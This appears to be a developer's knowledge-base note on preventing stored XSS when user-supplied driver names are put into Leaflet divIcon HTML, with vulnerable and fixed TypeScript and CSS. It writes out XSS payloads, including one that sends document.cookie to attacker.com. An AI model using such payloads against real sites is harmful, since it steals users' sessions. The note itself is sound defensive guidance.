---
title: "Leaflet divIcon innerHTML Requires escapeHtml for XSS Prevention"
aliases: [leaflet-divicon-xss, divicon-innerHTML, leaflet-xss, map-marker-xss]
tags: [security, leaflet, frontend, xss, gotcha]
sources:
  - "daily/2026-05-19.md"
created: 2026-05-19
updated: 2026-05-19
---

# Leaflet divIcon innerHTML Requires escapeHtml for XSS Prevention

Leaflet's `L.divIcon()` renders arbitrary HTML via the `html` option. When the HTML string is built from user-supplied data (e.g., driver name on a map marker), failing to escape the content creates a stored XSS vulnerability — any user whose name contains `<script>` or `<img onerror=...>` can inject JavaScript that executes in all other users' browsers.

## Key Points

- `L.divIcon({ html: \`<div>${driverName}</div>\` })` with unescaped user data = XSS
- Driver name is user-controlled via profile edit — attacker can set name to `<img src=x onerror=alert(1)>`
- Fix: `escapeHtml(driverName)` before interpolating into the `html` string
- Also apply `max-width: 180px` + CSS `text-overflow: ellipsis` + `overflow: hidden` to prevent long names from overflowing the map
- The CSS truncation is UX; the `escapeHtml` is security — both are required

## Details

Leaflet markers on interactive maps often display user-generated content: driver names, vehicle descriptions, pickup notes. `L.divIcon()` is the standard way to create custom HTML markers in Leaflet, and it inserts the `html` option directly into the DOM via `innerHTML`. This bypasses browser sanitization.

Vulnerable pattern:

```typescript
const marker = L.marker([lat, lng], {
  icon: L.divIcon({
    html: `<div class="driver-marker">${driverName}</div>`,  // XSS!
    className: "",
    iconSize: [60, 30],
  }),
});
```

If `driverName` is `<img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)">`, the payload executes in every other user's browser that loads the map with this marker visible.

Secure pattern:

```typescript
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

const marker = L.marker([lat, lng], {
  icon: L.divIcon({
    html: `<div class="driver-marker">${escapeHtml(driverName)}</div>`,
    className: "",
    iconSize: [60, 30],
  }),
});
```

The CSS truncation for long names:

```css
.driver-marker {
  max-width: 180px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
```

**Why truncation alone is insufficient for security:** A name 10000 characters long may be truncated visually but the full string is still in the DOM. If it contains `onerror` attributes or `<script>` tags, CSS truncation does not prevent their execution — only HTML escaping does.

The `escapeHtml` helper should be in a shared utility module (not duplicated per component), because the same risk applies anywhere user content is inserted via `innerHTML` — Leaflet popups, custom tooltips, map overlays.

## Related Concepts

- [[concepts/csp-tile-provider-telegram]] — CSP is a complementary defense: a strict `script-src` policy limits what injected scripts can do; but CSP should be defense-in-depth, not the primary XSS mitigation
- [[concepts/leaflet-css-zero-height]] — Leaflet rendering setup; both this and the CSS import are required for correct, secure map markers
- [[concepts/auth-security-vulnerabilities]] — XSS is in the same category as the auth bugs found in code review; both require proactive inspection, not wait-for-report

## Sources

- [[daily/2026-05-19.md]] — Session 14:44: driver name on map marker not escaped → XSS via `L.divIcon({ html })` innerHTML; fix: `escapeHtml()` before interpolation + `max-width: 180px` + CSS `text-overflow: ellipsis`
